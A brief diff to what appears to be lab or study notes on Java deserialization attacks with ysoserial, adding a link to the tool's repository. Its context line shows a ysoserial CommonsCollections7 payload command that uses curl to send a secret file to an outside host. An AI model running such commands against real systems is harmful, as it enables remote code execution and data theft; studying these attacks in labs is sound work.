@@ -69,3 +69,4 @@ java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2u
 
 java -jar ysoseriar.jar <PAYLOAD> 'COMMAND' | encoding
 ```
+For more information about payloads and stuff you can find in the ysoserial [official repository](https://github.com/frohoff/ysoserial)
